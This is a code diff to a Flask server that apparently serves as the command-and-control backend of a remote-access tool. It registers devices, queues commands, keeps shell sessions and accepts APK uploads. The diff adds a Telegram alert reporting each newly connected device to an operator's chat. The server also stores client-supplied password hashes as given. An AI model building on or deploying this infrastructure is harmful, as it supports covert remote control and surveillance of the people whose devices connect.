@@ -1,6 +1,7 @@
 from flask import Flask, request, jsonify, send_from_directory
 from werkzeug.utils import secure_filename
 import os, hashlib, uuid, datetime
+import requests
 
 app = Flask(__name__)
 
@@ -21,9 +22,21 @@ users = {
 }
 commands, results, shell_sessions = {}, {}, {}
 
+# === Telegram Notification Config ===
+TELEGRAM_API = "https://api.telegram.org"
+
 def hash_password(p): return hashlib.sha256(p.encode()).hexdigest()
 def now(): return datetime.datetime.utcnow().isoformat()
 def allowed(f): return '.' in f and f.rsplit('.', 1)[1].lower() in {'jpg','png','mp4','mp3','txt','zip','wav','json','apk'}
+
+def notify_telegram(bot_token, chat_id, device_id):
+    url = f"{TELEGRAM_API}/bot{bot_token}/sendMessage"
+    text = f"✅ New device connected: `{device_id}`"
+    return requests.post(url, json={
+        "chat_id": chat_id,
+        "text": text,
+        "parse_mode": "Markdown"
+    }).json()
 
 # === Auth ===
 @app.route('/login', methods=['POST'])
@@ -45,7 +58,22 @@ def login():
 @app.route('/register_device', methods=['POST'])
 def register_device():
     d = request.json
-    devices[d['device_id']] = {"owner_token": d['owner_token'], "last_seen": now()}
+    device_id = d['device_id']
+    owner_token = d['owner_token']
+    bot_token = d.get('bot_token')
+    chat_id = d.get('chat_id')
+
+    devices[device_id] = {
+        "owner_token": owner_token,
+        "last_seen": now(),
+        "bot_token": bot_token,
+        "chat_id": chat_id
+    }
+
+    # Notify Telegram if possible
+    if bot_token and chat_id:
+        notify_telegram(bot_token, chat_id, device_id)
+
     return jsonify(status='registered')
 
 @app.route('/heartbeat', methods=['POST'])
@@ -182,8 +210,8 @@ def change_password():
     d = request.json
     token, new_hashed_pass = d['user_token'], d['new_password']
     if token in users:
-        users[token]['password'] = new_hashed_pass  # Client already hashes
-        return jsonify(status='updated')
+        users[token]['password'] = new_hashed_pass
+        return jsonify(status='updated', confirm=True)
     return jsonify(status='not_found'), 404
 
 # === Run ===
